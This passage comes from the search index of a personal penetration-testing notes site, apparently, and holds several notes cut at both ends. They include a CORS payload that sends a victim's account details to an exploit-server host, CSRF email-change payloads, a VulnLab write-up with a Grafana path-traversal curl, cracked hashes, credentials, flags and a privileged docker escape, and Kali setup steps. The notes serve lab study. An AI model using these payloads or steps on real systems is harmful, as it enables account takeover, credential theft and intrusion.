:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;iframe \u003cspan class=\"nv\"\u003esandbox\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;allow-scripts allow-top-navigation allow-forms\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;data:text/html,\u0026lt;script\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003evar req = new XMLHttpRequest();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003ereq.onload = reqListener;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003ereq.open(\u0026#39;get\u0026#39;,\u0026#39;https://0a5e006d0328ba97827c602100bb0093.web-security-academy.net/accountDetails\u0026#39;,true);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003ereq.withCredentials = true;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003ereq.send();\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003efunction reqListener() {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003elocation=\u0026#39;https://exploit-0a6c006c0386baea820e5f1f013e00e3.exploit-server.net/log?key=\u0026#39;+this.responseText;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e};\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026lt;/script\u0026gt;\u0026#34;\u003c/span\u003e\u0026gt;\u0026lt;/iframe\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003ch2 id=\"xss--cors\"\u003eXSS + CORs\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCheck Allow origin :\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eIf there is an xss in a subdomain you can exploit the Cors , in this case it only accept this domain \u003ccode\u003ehttp://0a8600b203276610850ea08900b8000b.web-security-academy.net\u003c/code\u003e and also the subdomain .\u003c/p\u003e","tags":[],"title":"Cors"},{"content":" Free Poc Tool : https://security.love/CSRF-PoC-Genorator/ Basic CSRF \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://vulnerable-website.com/email/change\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;pwned@evil-user.net\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\rEven possible to do so : \u0026lt;img src=\u0026#34;https://vulnerable-website.com/email/change?email=pwned@evil-user.net\u0026#34;\u0026gt;\r","date":"2023-09-07","id":35,"permalink":"/notes/web/csrf/","summary":"\u003cul\u003e\n\u003cli\u003eFree Poc Tool :\nhttps://security.love/CSRF-PoC-Genorator/\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"basic-csrf\"\u003eBasic CSRF\u003c/h2\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;html\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;body\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;form \u003cspan class=\"nv\"\u003eaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://vulnerable-website.com/email/change\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003emethod\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;POST\u0026#34;\u003c/span\u003e\u0026gt; \u0026lt;input \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;hidden\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;email\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pwned@evil-user.net\u0026#34;\u003c/span\u003e /\u0026gt; \u0026lt;/form\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;script\u0026gt; document.forms\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e.submit\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u0026lt;/script\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/body\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEven possible to do so :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;img \u003cspan class=\"nv\"\u003esrc\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://vulnerable-website.com/email/change?email=pwned@evil-user.net\u0026#34;\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"CSRF"},{"content":"#Docker Scan :\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a79f80cce39c3fc4d69de8efb377142b (RSA) | 256 f5ab5249cacfddc6cd61bdbdefbf18b4 (ECDSA) |_ 256 5e63f3d67f5c89df77eb2aac3154f8b2 (ED25519) 3000/tcp open ppp? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Sun, 21 Jul 2024 19:25:24 GMT | Content-Length: 29 | href=\u0026#34;/login\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. | GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Sun, 21 Jul 2024 19:24:54 GMT | Content-Length: 29 | href=\u0026#34;/login\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. | HTTPOptions: | HTTP/1.0 302 Found | Cache-Control: no-cache | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Sun, 21 Jul 2024 19:24:59 GMT |_ Content-Length: 0\rCve Path traversal \u0026ndash;\u0026gt;\ncurl \u0026#39;http://10.10.81.63:3000/public/plugins/barchart/../../../../../../../../../var/lib/grafana/grafana.db\u0026#39; --path-as-is --output grafana.db\rBoris : dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8 salt :LCBhdtJWjl rands :mYl941ma8w --------------------------------------------------------------------------------- Admin : 7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8 salt : YObSoLj55S rands : hLLY6QQ4Y6\rI type : convert grafana hash to hashcat format and got a script that does the job : https://github.com/iamaldi/grafana2hashcat Creds : boris:beautiful1\rUser: VL{fbc4248a6ec4f7936b92ec76ad0cb654}\nWe can run docker exec as sudo , as we can imagine grafana is running in a docker so we can basically grab thanks to the lfi the container id and try to grab a shell as root with all privilege . We can simply mnt the main disk on the docker and read the flag .\nHere is the command :\nsudo /snap/bin/docker exec --privileged --user 0 -i -t e6ff5b1cbc85 /bin/bash\rNext time don\u0026rsquo;t forget to check the docs https://github.com/ivanversluis/pentest-hacktricks/blob/master/linux-unix/privilege-escalation/docker-breakout.md\nRoot : VL{37c930a3b8b53457d080b0a6f033bc16} ","date":"2023-09-07","id":36,"permalink":"/notes/lab/vulnlab/data/","summary":"\u003cp\u003e#Docker\nScan :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e2048\u003c/span\u003e a79f80cce39c3fc4d69de8efb377142b \u003cspan class=\"o\"\u003e(\u003c/span\u003eRSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e f5ab5249cacfddc6cd61bdbdefbf18b4 \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e 5e63f3d67f5c89df77eb2aac3154f8b2 \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3000/tcp open  ppp?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e fingerprint-strings:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   FourOhFourRequest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.0 \u003cspan class=\"m\"\u003e302\u003c/span\u003e Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Cache-Control: no-cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Expires: -1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Location: /login\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Pragma: no-cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003eredirect_to\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Content-Type-Options: nosniff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Frame-Options: deny\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Xss-Protection: 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003emode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eblock\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Date: Sun, \u003cspan class=\"m\"\u003e21\u003c/span\u003e Jul \u003cspan class=\"m\"\u003e2024\u003c/span\u003e 19:25:24 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Length: \u003cspan class=\"m\"\u003e29\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/login\u0026#34;\u003c/span\u003e\u0026gt;Found\u0026lt;/a\u0026gt;.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.1 \u003cspan class=\"m\"\u003e400\u003c/span\u003e Bad Request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/plain\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Connection: close\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Request\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   GetRequest:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.0 \u003cspan class=\"m\"\u003e302\u003c/span\u003e Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Cache-Control: no-cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Type: text/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003echarset\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eutf-8\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Expires: -1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Location: /login\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Pragma: no-cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003eredirect_to\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2F\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Content-Type-Options: nosniff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Frame-Options: deny\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Xss-Protection: 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003emode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eblock\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Date: Sun, \u003cspan class=\"m\"\u003e21\u003c/span\u003e Jul \u003cspan class=\"m\"\u003e2024\u003c/span\u003e 19:24:54 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Content-Length: \u003cspan class=\"m\"\u003e29\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     \u003cspan class=\"nv\"\u003ehref\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/login\u0026#34;\u003c/span\u003e\u0026gt;Found\u0026lt;/a\u0026gt;.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   HTTPOptions:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     HTTP/1.0 \u003cspan class=\"m\"\u003e302\u003c/span\u003e Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Cache-Control: no-cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Expires: -1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Location: /login\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Pragma: no-cache\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Set-Cookie: \u003cspan class=\"nv\"\u003eredirect_to\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2F\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/\u003cspan class=\"p\"\u003e;\u003c/span\u003e HttpOnly\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003eSameSite\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eLax\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Content-Type-Options: nosniff\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Frame-Options: deny\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     X-Xss-Protection: 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003emode\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eblock\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e     Date: Sun, \u003cspan class=\"m\"\u003e21\u003c/span\u003e Jul \u003cspan class=\"m\"\u003e2024\u003c/span\u003e 19:24:59 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Content-Length: \u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eCve Path traversal \u0026ndash;\u0026gt;\u003c/p\u003e","tags":[],"title":"Data"},{"content":"1-Step : install GNOME :\nsudo apt install kali-desktop-gnome #then select gdm3\radd extension :\nsudo apt install gnome-shell-extension-manager\rsearch for transparent top-bar , then install it and finally adjust the value Add an Apple look with this : https://www.gnome-look.org/p/1403328/ https://www.gnome-look.org/p/1102582/ https://www.gnome-look.org/p/1148748/ https://www.youtube.com/watch?v=ymFNDSDqFDE\nMore config (obsidian) : Window frame style set to --\u0026gt; native frame\rFor the system : sudo apt install dconf-editor\rNavigate to org/gnome/desktop/wm/preferences and look for the option button-layout. Set it :\nclose,minimize,maximize:\r2-step:\nInstall flatpack :\nsudo apt install flatpak sudo apt install gnome-software-plugin-flatpak sudo flatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo\rinstall: backbox :\nsudo flatpak install flathub com.raggesilver.BlackBox #and add sortcut to start it with this command : flatpak run com.raggesilver.BlackBox\r3-step:\nOhMyZsh :\nsudo apt install zsh sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\rthen add in .zshrc.conf file in the plugin parameter :\ngit sudo history encode64 copypath zsh-autosuggestions zsh-syntax-highlighting\r4-step:\ntmux :\nsudo apt install tmux echo \u0026#34;set -g mouse on\u0026#34; \u0026gt;\u0026gt; ~/.tmux.conf\rOr: https://github.com/Arszilla/kali-i3-gapsqQ ","date":"2023-09-07","id":37,"permalink":"/notes/ressources/debian-setup/","summary":"\u003cp\u003e1-Step :\ninstall GNOME :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption 